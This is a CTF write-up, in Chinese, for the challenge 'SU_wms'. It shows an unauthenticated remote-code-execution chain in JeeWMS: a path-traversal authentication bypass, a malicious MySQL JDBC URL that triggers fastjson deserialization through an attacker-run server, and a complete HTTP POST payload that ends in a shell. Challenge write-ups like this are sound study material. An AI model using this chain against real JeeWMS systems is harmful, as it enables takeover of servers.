# SU_wms

## 题目描述

简单的小0day，试试前台RCE吧(PS：请本地打通再测试线上)

A simple zero-day trial, try front-end RCE(P.S.: Please test locally before testing online.)

## 环境搭建

```
docker-compose up
```

## 解题思路

jeewms存在非常老版本的mysql版本

![图片1-1](./img/图片1-1.png) 

后台存在配置jdbc的模块

![图片1-2](./img/图片1-2.png) 

该模块对传入的jdbc参数没有任何过滤，可以通过配置恶意mysql jdbc参数实现命令执行

![图片1-3](./img/图片1-3.png) 

依赖中存在fastjson，可以利用mysql jdbc打fastjson反序列化实现命令执行

![图片1-4](./img/图片1-4.png) 

利用java-chains配置恶意mysql 服务器

![图片1-5](./img/图片1-5.png) 

但想要进后台必须要Cookie，在JeeWMS的鉴权这里存在一个判断，如果访问的URL里包含excludeContainUrls 就直接用return true放行 ：

![图片1-6](./img/图片1-6.png) 

excludeContainUrls 的值包括下面两个：

![图片1-7](./img/图片1-7.png) 

所以只要我们的url含这两个路径，访问的时候就无需鉴权直接放行，比如接口/jeewms/rest/cgformTemplateController.do ，正常访问的时候会被拦截：

![QQ20260301-215847-8](./img/QQ20260301-215847-8.png)

但是把URL换成 /jeewms/systemController/showOrDownByurl.do/../../rest/cgformTemplateController.do即可在未授权的情况下访问接口：

![QQ20260301-220025-9](./img/QQ20260301-220025-9.png) 

结合鉴权绕过的漏洞，配合JDBC配置，即可实现在未授权情况下任意命令执行

此处的mysql jdbc url为

```
jdbc:mysql://127.0.0.1:3308/?detectCustomCollations=true&autoDeserialize=true&user=d163369
```

将user改为java-chains生成的user id，然后url 编码后替换参数url即可

```
POST /jeewms/systemController/showOrDownByurl.do/../../dynamicDataSourceController.do?testConnection HTTP/1.1
Host: xxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: close
Cookie: JSESSIONID=6AD1142405C3298046DBDACF7FAC0317; JSESSIONID=A470B16BC3C1A63F71328DF4AF4120D5; java-chains-token-key=admin_token
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 258

id=&dbKey=aaa&description=aaa&dbType=mysql&driverClass=com.mysql.jdbc.Driver&url=jdbc%3Amysql%3A%2F%2Fxxx%2Exx%2Exxx%2Exxx%3A3308%2F%3FdetectCustomCollations%3Dtrue%26autoDeserialize%3Dtrue%26user%3Dd99cd32&autoDeserialize=true&dbName=a&dbUser=a&dbPassword=a
```

弹shell，拿flag

![QQ20260301-220307-1-8](./img/QQ20260301-220307-1-8.png)
